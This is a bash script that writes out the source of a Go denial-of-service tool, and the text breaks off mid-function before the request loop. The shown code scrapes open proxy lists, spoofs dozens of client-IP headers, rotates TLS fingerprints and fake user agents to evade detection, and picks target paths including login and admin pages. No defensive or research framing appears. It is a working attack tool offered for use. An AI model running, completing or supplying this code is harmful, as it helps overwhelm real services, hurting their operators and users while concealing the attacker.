#!/bin/bash

# ----------------------------------------
# GO DOS TOOL SETUP (HTTP/2 + HTTP/1.1 ONLY)
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Create main.go file directly
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced undetectable IP spoofing...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	// Country codes for geo-spoofing
	countryCodes = []string{
		"A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
		"AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
		"BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
		"CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
		"DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
		"GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
		"GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
		"IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
		"LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
		"MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
		"MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
		"PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
		"RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
		"SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
		"TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
	}

	// Multiple proxy API sources
	proxyAPISources = []string{
		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		"https://proxy-list.download/api/v1/get?type=http",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
		"https://api.openproxylist.xyz/http.txt",
		"https://proxylist.icu/proxy/http.txt",
		"https://raw.githubusercontent.com/ALIILAPRO/proxy-list/main/http.txt",
	}

	// Expanded IP spoofing headers for undetectability
	ipSpoofingHeaders = []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"X-Originating-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-Forwarded-Server",
		"CF-Connecting-IP",
		"True-Client-IP",
		"X-Proxy-IP",
		"X-Original-Forwarded-For",
		"Forwarded",
		"X-Forwarded",
		"X-Forwarded-For-Original",
		"X-Cluster-Client-IP",
		"X-Proxy-ID",
		"X-Real-IP-Original",
		"X-Custom-IP",
		"X-Originating-URL",
		"X-Remote-URL",
		"X-Original-URL",
		"X-Rewrite-URL",
		"X-Proxy-Host",
		"X-Proxy-Server",
		"X-Gateway-IP",
		"X-Edge-IP",
		"X-CDN-IP",
		"X-Varnish-IP",
		"X-Squid-IP",
		"X-HAProxy-IP",
	}

	// Real ASN ranges for more believable spoofing
	asnPrefixes = []string{
		"AS15169", "AS16509", "AS14618", "AS8075", "AS32934",
		"AS13335", "AS54113", "AS26496", "AS46606", "AS36352",
		"AS14061", "AS16276", "AS20473", "AS63949", "AS24940",
	}

	// Real ISP names for spoofing
	ispNames = []string{
		"Google LLC", "Amazon Web Services", "Microsoft Corporation", "Cloudflare Inc",
		"DigitalOcean", "OVH SAS", "Vultr Holdings", "Hetzner Online GmbH",
		"Comcast Cable", "AT&T Services", "Verizon Communications", "T-Mobile USA",
		"Deutsche Telekom", "British Telecom", "Orange S.A.", "NTT Communications",
		"China Telecom", "SoftBank Corp", "Telstra Corporation", "SingTel",
	}

	// Real User-Agent strings (avoiding patterns)
	realUserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36 Edg/141.0.7390.108",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, identity",
		"deflate, gzip",
		"compress, gzip",
		"br",
		"*",
		"identity",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"no-transform",
		"only-if-cached",
		"public",
		"private",
		"proxy-revalidate",
		"s-maxage=86400",
		"must-revalidate",
		"max-age=0",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-XSS-Protection": "1; mode=block"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Site": "none"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "1"},
		{"Sec-Fetch-User": "?1"},
		{"Sec-Fetch-User-Agent": "Mozilla/5.0"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-CSRF-Token": ""},
		{"X-API-Key": ""},
	}

	// Common browser features for fingerprint spoofing
	browserPlugins = []string{
		"Chrome PDF Plugin", "Shockwave Flash", "Chrome Remote Desktop Viewer",
		"Native Client", "Widevine Content Decryption Module",
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	// Randomize TLS session ticket and record sizing
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        100,
					MaxIdleConnsPerHost: 100,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromMultipleSources() {
	var allProxies []string
	proxySources := proxyAPISources
	
	fmt.Printf("[+] Loading proxies from %d sources...\n", len(proxySources))
	
	for i, api := range proxySources {
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Get(api)
		if err != nil {
			continue
		}
		
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		scanner := bufio.NewScanner(strings.NewReader(string(body)))
		count := 0
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				parts := strings.Split(line, ":")
				if len(parts) >= 2 {
					if _, err := strconv.Atoi(parts[1]); err == nil {
						allProxies = append(allProxies, line)
						count++
					}
				}
			}
		}
		
		if count > 0 {
			fmt.Printf("[+] Source %d/%d: Loaded %d proxies\n", i+1, len(proxySources), count)
		}
		
		time.Sleep(500 * time.Millisecond)
	}
	
	uniqueProxies := make(map[string]bool)
	var cleanProxies []string
	for _, proxy := range allProxies {
		if !uniqueProxies[proxy] {
			uniqueProxies[proxy] = true
			cleanProxies = append(cleanProxies, proxy)
		}
	}
	
	proxyMu.Lock()
	proxies = cleanProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
	
	fmt.Printf("[+] Total unique proxies loaded: %d\n", len(proxies))
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		fmt.Printf("[+] Refreshing proxies...\n")
		loadProxiesFromMultipleSources()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
}

// Advanced IP spoofing functions for undetectability
func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomPrivateIP() string {
	privateRanges := [][]int{
		{10, 0, 0, 0, 10, 255, 255, 255},     // 10.0.0.0/8
		{172, 16, 0, 0, 172, 31, 255, 255},    // 172.16.0.0/12
		{192, 168, 0, 0, 192, 168, 255, 255},  // 192.168.0.0/16
	}
	rangeIdx := randInt(0, len(privateRanges)-1)
	r := privateRanges[rangeIdx]
	return fmt.Sprintf("%d.%d.%d.%d", 
		randInt(r[0], r[4]), 
		randInt(r[1], r[5]), 
		randInt(r[2], r[6]), 
		randInt(r[3], r[7]))
}

func randomIPv6() string {
	parts := make([]string, 8)
	for i := range parts {
		parts[i] = fmt.Sprintf("%x", randInt(0, 65535))
	}
	return strings.Join(parts, ":")
}

func randomCIDR() string {
	cidr := randInt(8, 32)
	ip := randomIP()
	return fmt.Sprintf("%s/%d", ip, cidr)
}

func randomASN() string {
	return asnPrefixes[randInt(0, len(asnPrefixes)-1)]
}

func randomISP() string {
	return ispNames[randInt(0, len(ispNames)-1)]
}

func randomCountryCode() string {
	return countryCodes[randInt(0, len(countryCodes)-1)]
}

func randomBrowserPlugin() string {
	return browserPlugins[randInt(0, len(browserPlugins)-1)]
}

// Generate realistic proxy chain with varying lengths
func generateProxyChain() string {
	numProxies := randInt(1, 5)
	chain := make([]string, numProxies)
	for i := range chain {
		if randBool() {
			chain[i] = randomPrivateIP()
		} else {
			chain[i] = randomIP()
		}
	}
	return strings.Join(chain, ", ")
}

// Generate random port numbers (realistic)
func randomPort() int {
	commonPorts := []int{80, 443, 8080, 8443, 3128, 1080, 8888, 8000}
	if randInt(1, 100) <= 70 {
		return commonPorts[randInt(0, len(commonPorts)-1)]
	}
	return randInt(1024, 65535)
}

// Generate realistic forwarder string
func generateForwarderString() string {
	forwarders := []string{
		"http://proxy%d.example.com:%d",
		"https://gateway%d.net:%d",
		"http://cache%d.cloudflare.com:%d",
		"https://edge%d.fastly.net:%d",
	}
	forwarder := forwarders[randInt(0, len(forwarders)-1)]
	return fmt.Sprintf(forwarder, randInt(1, 999), randomPort())
}

// Advanced header generation for undetectability
func addUndetectableHeaders(req *http.Request) {
	spoofedIP := randomIP()
	
	// Always add these core headers
	req.Header.Set("X-Forwarded-For", spoofedIP)
	req.Header.Set("X-Real-IP", spoofedIP)
	
	// Add 5-12 random spoofing headers for more randomness
	numHeaders := randInt(5, 13)
	selectedHeaders := make(map[string]bool)
	
	for i := 0; i < numHeaders; i++ {
		headerName := ipSpoofingHeaders[randInt(0, len(ipSpoofingHeaders)-1)]
		if selectedHeaders[headerName] {
			continue
		}
		selectedHeaders[headerName] = true
		
		// Sophisticated header value generation
		switch headerName {
		case "Forwarded":
			forwardedParts := []string{
				fmt.Sprintf("for=%s", spoofedIP),
				fmt.Sprintf("by=%s", randomASN()),
				fmt.Sprintf("proto=%s", []string{"http", "https"}[randInt(0, 1)]),
			}
			if randBool() {
				forwardedParts = append(forwardedParts, fmt.Sprintf("host=%s", generateForwarderString()))
			}
			req.Header.Set(headerName, strings.Join(forwardedParts, "; "))
			
		case "X-Forwarded-For-Original", "X-Cluster-Client-IP":
			req.Header.Set(headerName, generateProxyChain())
			
		case "X-Client-IP", "X-Real-IP", "X-Originating-IP":
			if randBool() {
				req.Header.Set(headerName, randomPrivateIP())
			} else {
				req.Header.Set(headerName, spoofedIP)
			}
			
		default:
			// Randomly choose between IPv4, private IP, or IPv6
			ipType := randInt(1, 100)
			if ipType <= 70 {
				req.Header.Set(headerName, spoofedIP)
			} else if ipType <= 85 {
				req.Header.Set(headerName, randomPrivateIP())
			} else {
				req.Header.Set(headerName, randomIPv6())
			}
		}
	}
	
	// Add ISP and network info (30% chance)
	if randInt(1, 100) <= 30 {
		req.Header.Set("X-ISP", randomISP())
		req.Header.Set("X-Network-Name", fmt.Sprintf("%s Network", randomISP()))
		req.Header.Set("X-ASN", randomASN())
	}
	
	// Add geo-location spoofing (35% chance)
	if randInt(1, 100) <= 35 {
		country := randomCountryCode()
		req.Header.Set("X-Geo-Country", country)
		req.Header.Set("X-Country-Code", country)
		req.Header.Set("CF-IPCountry", country)
		req.Header.Set("X-Geo-Region", fmt.Sprintf("Region-%d", randInt(1, 50)))
		req.Header.Set("X-Geo-City", fmt.Sprintf("City-%d", randInt(1, 1000)))
	}
	
	// Add X-Forwarded-For with multiple hops (40% chance)
	if randInt(1, 100) <= 40 {
		numHops := randInt(2, 6)
		hops := make([]string, numHops)
		for i := range hops {
			if i == numHops-1 {
				hops[i] = spoofedIP
			} else if randBool() {
				hops[i] = randomPrivateIP()
			} else {
				hops[i] = randomIP()
			}
		}
		multiHop := strings.Join(hops, ", ")
		req.Header.Set("X-Forwarded-For", multiHop)
	}
	
	// Add browser fingerprinting evasion headers
	if randInt(1, 100) <= 25 {
		req.Header.Set("X-Browser-Fingerprint", fmt.Sprintf("%x", randInt(1000000, 9999999)))
		req.Header.Set("X-Plugin-List", randomBrowserPlugin())
	}
	
	// Add timing attack evasion (random delays in headers)
	if randInt(1, 100) <= 15 {
		req.Header.Set("X-Request-Timestamp", time.Now().Add(time.Duration(randInt(-300, 300))*time.Millisecond).Format(time.RFC3339Nano))
	}
}

func generateRandomUA() string {
	// Use real User-Agent strings 60% of the time
	if randInt(1, 100) <= 60 {
		return realUserAgents[randInt(0, len(realUserAgents)-1)]
	}
	
	browserType := randInt(1, 100)
	countryCode := randomCountryCode()
	
	windowsVersions := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Windows NT 12.0; Win64; x64",
		"Windows NT 10.0; Win64; x64; Xbox",
	}
	
	macVersions := []string{
		"Macintosh; Intel Mac OS X 15_0",
		"Macintosh; Intel Mac OS X 15_1",
		"Macintosh; Intel Mac OS X 15_2",
		"Macintosh; Intel Mac OS X 16_0",
		"Macintosh; Intel Mac OS X 16_1",
		"Macintosh; ARM Mac OS X 15_0",
		"Macintosh; ARM Mac OS X 16_0",
	}
	
	linuxVersions := []string{
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux x86_64",
		"X11; Fedora; Linux x86_64",
		"X11; Debian; Linux x86_64",
		"X11; Linux x86_64; Arch",
	}
	
	chromeMajor := randInt(141, 165)
	chromeBuild := randInt(5000, 8000)
	chromePatch := randInt(0, 99)
	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
	
	firefoxMajor := randInt(135, 165)
	firefoxMinor := randInt(0, 9)
	firefoxPatch := randInt(0, 99)
	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
	
	edgeMajor := randInt(141, 165)
	edgeBuild := randInt(5000, 8000)
	edgePatch := randInt(0, 99)
	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
	
	safariMajor := randInt(18, 22)
	safariMinor := randInt(0, 5)
	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
	
	androidVersions := []string{"15", "16", "17"}
	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
	
	if browserType <= 45 {
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
	} else if browserType <= 75 {
		osType := randInt(1, 100)
		var os string
		if osType <= 40 {
			os = windowsVersions[randInt(0, len(windowsVersions)-1)]
		} else if osType <= 70 {
			os = macVersions[randInt(0, len(macVersions)-1)]
		} else {
			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
		}
		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
	} else if browserType <= 88 {
		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
	} else if browserType <= 95 {
		os := macVersions[randInt(0, len(macVersions)-1)]
		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
	} else {
		mobileType := randInt(1, 100)
		if mobileType <= 60 {
			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
		} else if mobileType <= 85 {
			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
		} else {
			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
		}
	}
}

func randomReferer() string {
	domains := []string{
		"google.com", "bing.com", "duckduckgo.com", "facebook.com", "reddit.com",
		"youtube.com", "twitter.com", "linkedin.com", "instagram.com", "tiktok.com",
		"wikipedia.org", "amazon.com", "netflix.com", "spotify.com", "yahoo.com",
		"github.com", "stackoverflow.com", "quora.com", "medium.com", "pinterest.com",
	}
	
	paths := []string{
		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", "/about", "/#",
		"/discover", "/top", "/latest", "/random", "/featured", "/viral",
	}
	
	protocols := []string{"https", "http"}
	protocol := protocols[randInt(0, len(protocols)-1)]
	domain := domains[randInt(0, len(domains)-1)]
	path := paths[randInt(0, len(paths)-1)]
	
	if randInt(1, 100) <= 70 {
		path += "?q=" + randomString(randInt(3, 10))
		if randBool() {
			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
		}
	}
	
	return fmt.Sprintf("%s://%s%s", protocol, domain, path)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql", "wp-login.php",
		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
